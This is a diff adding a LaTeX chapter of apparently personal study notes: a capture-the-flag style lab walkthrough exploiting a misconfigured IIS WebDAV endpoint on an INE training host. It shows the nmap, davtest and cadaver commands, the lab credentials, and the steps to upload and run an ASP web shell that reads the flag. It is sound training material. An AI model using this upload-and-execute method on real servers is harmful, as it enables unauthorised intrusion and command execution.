@@ -1,0 +1,134 @@
+\chapter{Lab: IIS WebDAV Manual Exploitation}
+\label{lab:webdav_manual}
+
+\begin{notebox}[Lab objective]
+Exploit a misconfigured Microsoft IIS WebDAV endpoint to upload and execute a web
+shell, gain command execution, and retrieve the flag --- using manual tools only
+(no Metasploit exploit module).
+\end{notebox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Environment}
+\begin{itemize}
+  \item \textbf{Attacker:} Kali Linux (INE lab environment)
+  \item \textbf{Target:} \ic{demo.ine.local}
+  \item \textbf{Tools:} \ic{nmap}, \ic{davtest}, \ic{cadaver}, \ic{hydra}
+  \item \textbf{Credentials:} Provided by the lab
+\end{itemize}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 1 --- Confirm the Target is Alive}
+
+\begin{termbox}
+ping -c 1 demo.ine.local
+\end{termbox}
+
+Confirmed reachable. Noted the IP for all subsequent commands.
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 2 --- Port Scan and Service Detection}
+
+\begin{termbox}
+nmap -sV -sC demo.ine.local
+\end{termbox}
+
+\textbf{Key findings:}
+\begin{itemize}
+  \item Port 80 open --- Microsoft IIS 10.0
+  \item \ic{/webdav/} endpoint discovered returning 401 Unauthorized
+\end{itemize}
+
+\screenshot{assets/images/Screenshot_2025-10-18_at_12.39.13_PM.png}{nmap results showing IIS 10.0 on port 80 with /webdav/ returning 401}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 3 --- Confirm WebDAV and Test Upload Permissions with davtest}
+
+\begin{whybox}[Why davtest before anything else]
+davtest tells me two critical things: can I upload files, and will the server
+execute them? If ASP execution is not possible, there is no point uploading a
+shell. I need to know this before wasting time crafting a payload.
+\end{whybox}
+
+\begin{termbox}
+davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
+\end{termbox}
+
+\textbf{What I found:}
+\begin{itemize}
+  \item File upload via PUT: \textbf{SUCCESS} for multiple extensions
+  \item ASP execution: \textbf{SUCCESS} --- the server executes \ic{.asp} files
+  \item This confirms the full WebDAV RCE attack path is viable
+\end{itemize}
+
+\screenshot{assets/images/Screenshot_2025-10-22_at_5.03.28_PM.png}{davtest output confirming ASP upload and execution permissions}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 4 --- Upload Web Shell with Cadaver}
+
+Kali includes built-in web shells at \ic{/usr/share/webshells/}. I used the
+ASP web shell since the server executes \ic{.asp} files.
+
+\begin{termbox}
+# Find available shells
+ls -al /usr/share/webshells/asp/
+
+# Connect to WebDAV and upload
+cadaver http://demo.ine.local/webdav/
+# At credentials prompt:
+# Username: bob
+# Password: password_123321
+
+# Inside cadaver session:
+put /usr/share/webshells/asp/webshell.asp
+ls    # Confirm upload
+exit
+\end{termbox}
+
+\screenshot{assets/images/Screenshot_2025-10-25_at_3.30.49_PM.png}{Cadaver session uploading webshell.asp to the WebDAV directory}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 5 --- Execute Commands via Web Shell}
+
+Opened \ic{http://demo.ine.local/webdav/webshell.asp} in the browser. The
+web shell provides a command input field running on the server.
+
+Commands executed:
+\begin{termbox}
+whoami          # nt authority\iusr
+ipconfig        # Network configuration
+dir C:\         # Directory listing of C drive
+type C:\flag.txt   # Read the flag
+\end{termbox}
+
+\screenshot{assets/images/Screenshot_2025-10-26_at_10.50.35_AM.png}{Web shell running in browser with command execution output}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 6 --- Clean Up}
+
+\begin{termbox}
+cadaver http://demo.ine.local/webdav/
+delete webshell.asp
+exit
+\end{termbox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Result}
+
+Flag retrieved via web shell command execution. Lab objective completed.
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Key Learning}
+
+\begin{takebox}
+\begin{itemize}
+  \item The attack path here is entirely manual --- no Metasploit exploit module.
+        This is valuable because it shows the underlying mechanics that the
+        automated module abstracts away.
+  \item davtest is essential before uploading anything. Without knowing ASP
+        execution works, I could upload a payload that does nothing.
+  \item Web shells are immediate and visual. Meterpreter is more powerful, but
+        a web shell is faster to deploy when you just need a quick command.
+  \item Cleaning up uploaded files is professional practice and part of the
+        methodology.
+\end{itemize}
+\end{takebox}
